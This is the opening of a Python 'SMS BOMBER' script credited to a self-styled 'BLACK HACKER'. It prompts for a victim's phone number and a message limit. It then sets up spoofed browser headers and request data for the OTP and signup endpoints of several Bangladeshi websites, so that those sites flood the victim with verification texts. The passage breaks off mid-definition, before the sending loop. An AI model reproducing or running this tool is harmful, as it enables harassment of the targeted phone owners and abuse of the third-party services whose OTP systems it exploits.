#---------{ ADMIN INFO }----------
# AUTHOR   :MR: BLACK HACKER MUIIN
# TEAM     : cyber BLACK MUIIN, 
#-------------------------------- 

import sys
import time
import os
import requests
import smtplib

os.system("clear")
def slw(l):
  for i in l:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.1)


def primiam():
  os.system("clear")
  logo="""\033[38;5;46m
  
  


#FF0000 ██████  ███████ ███    ██  ██████  ███████ ██████  
#00FF00 ██   ██ ██      ████   ██ ██       ██      ██   ██ 
#0000FF ██   ██ █████   ██ ██  ██ ██   ███ █████   ██████  
#FFFF00 ██   ██ ██      ██  ██ ██ ██    ██ ██      ██   ██ 
#00FFFF ██████  ███████ ██   ████  ██████  ███████ ██   ██ 
                                                   
                                                   

                                
                                

DEVELOPER :BLACK HACKER MUIIN
GITHUB    : 😄😄 fuk you😄
VERSION   : 2.0
PROJECT   : SMS BOMBER 
FACEBOOK  :https://www.facebook.com/mithen.chowdhuri.7 
××××××××××××××××××××××××××××××××××××××××××××"""
  for i in logo:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.001)
  num=input("\n\n\033[38;5;195m[\033[38;5;46m+\033[38;5;195m] VICTIMS NUMBER : 880")
  limit=int(input("\n\033[38;5;195m[\033[38;5;46m+\033[38;5;195m] MESSAGE LIMIT : "))
  
  headers = {
      'authority': 'www.bioscopelive.com',
      'accept': '*/*',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.bioscopelive.com/en/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
      'x-requested-with': 'XMLHttpRequest',
  }
  
  url1=f"https://www.bioscopelive.com/en/login/send-otp?phone=880{num}&operator=bd-otp"
  
  headers2 = {
      'referer': 'https://redx.com.bd/',
      'user-agent':'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  data1 = {
      'name': num,
      'phoneNumber': num,
      'service': 'redx',
  }
  
  url2="https://api.redx.com.bd/v1/user/signup"
  
  headers3 = {
      'authority': 'bikroy.com',
      'accept': 'application/json, text/plain, */*',
      'accept-language': 'bn',
      'application-name': 'web',
      'referer': 'https://bikroy.com/bn/users/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  url3= "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0"+num
  
  headers4 = {
      'authority': 'www.ieatery.com.bd',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'referer': 'https://www.ieatery.com.bd/login',
      'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?1',
      'sec-ch-ua-platform': '"Android"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'same-origin',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  url4="https://www.ieatery.com.bd/otp-verify?phn=0"+num
  
  headers5 = {
      'referer': 'https://doctime.com.bd/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  data2 = {
      'flag': 'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
      'code': '88',
      'contact_no': '0'+num,
      'country_calling_code': '88',
  }
  
  headers6 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  data3 = {
      'mobile': '+88-0'+num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
  }
  headers7 = {
      'referer': 'https://osudpotro.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; M2010J19CI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
  }
  
  data4 = {
      'mobile': '+88-0'+num,
      'deviceToken': 'web',
      'language': 'en',
      'os': 'web',
  }
  headers8 = {
      'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'Connection': 'keep-alive',
      'Origin': 'https:/
